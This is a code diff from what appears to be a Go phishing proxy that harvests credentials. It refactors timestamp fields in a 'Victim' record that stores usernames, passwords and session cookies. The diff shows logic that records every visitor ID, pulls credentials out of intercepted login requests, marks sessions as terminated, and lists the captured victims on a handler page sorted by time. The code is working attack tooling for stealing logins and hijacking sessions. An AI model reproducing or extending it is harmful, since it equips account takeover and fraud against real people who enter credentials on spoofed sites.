@@ -247,13 +247,12 @@ var cookietemplate = `<!DOCTYPE html>
 `
 
 type Victim struct {
-	CredentialTimestamp *time.Time
-	UUID                string
-	Username            string
-	Password            string
-	Session             string
-	Terminated          bool
-	TerminatedTimestamp *time.Time
+	Timestamp  *time.Time
+	UUID       string
+	Username   string
+	Password   string
+	Session    string
+	Terminated bool
 }
 
 type Cookie struct {
@@ -494,8 +493,8 @@ func (config *ControlConfig) updateEntry(victim *Victim) error {
 		return err
 	}
 
-	if victim.CredentialTimestamp != nil {
-		entry.CredentialTimestamp = victim.CredentialTimestamp
+	if victim.Timestamp != nil {
+		entry.Timestamp = victim.Timestamp
 	}
 
 	if victim.Password != "" {
@@ -511,10 +510,6 @@ func (config *ControlConfig) updateEntry(victim *Victim) error {
 
 	if victim.Terminated {
 		entry.Terminated = true
-	}
-
-	if victim.TerminatedTimestamp != nil {
-		entry.TerminatedTimestamp = victim.TerminatedTimestamp
 	}
 
 	err = config.addEntry(entry)
@@ -615,8 +610,8 @@ func HelloHandler(w http.ResponseWriter, r *http.Request) {
 
 	victims, _ := CConfig.listEntries()
 	sort.SliceStable(victims, func(i, j int) bool {
-		ti := victims[i].CredentialTimestamp
-		tj := victims[j].CredentialTimestamp
+		ti := victims[i].Timestamp
+		tj := victims[j].Timestamp
 
 		if ti == nil && tj == nil {
 			return true
@@ -992,10 +987,11 @@ func init() {
 	s.HTTPRequest = func(req *http.Request, context *HTTPContext) {
 
 		if CConfig.active {
+			now := time.Now()
 
 			if context.UserID != "" {
 				// Save every new ID that comes to the site
-				victim := Victim{UUID: context.UserID}
+				victim := Victim{UUID: context.UserID, Timestamp: &now}
 				_, err := CConfig.getEntry(&victim)
 				// Entry doesn't exist yet
 				if err != nil {
@@ -1006,14 +1002,13 @@ func init() {
 				}
 			}
 
-			now := time.Now()
 			if creds, found := CConfig.checkRequestCredentials(req); found {
 
 				victim := Victim{
-					UUID:                context.UserID,
-					Username:            creds.usernameFieldValue,
-					Password:            creds.passwordFieldValue,
-					CredentialTimestamp: &now,
+					UUID:      context.UserID,
+					Username:  creds.usernameFieldValue,
+					Password:  creds.passwordFieldValue,
+					Timestamp: &now,
 				}
 
 				if err := CConfig.updateEntry(&victim); err != nil {
@@ -1099,9 +1094,9 @@ func init() {
 
 		now := time.Now()
 		victim := Victim{
-			UUID:                userID,
-			Terminated:          true,
-			TerminatedTimestamp: &now,
+			UUID:       userID,
+			Terminated: true,
+			Timestamp:  &now,
 		}
 		err := CConfig.updateEntry(&victim)
 		if err != nil {
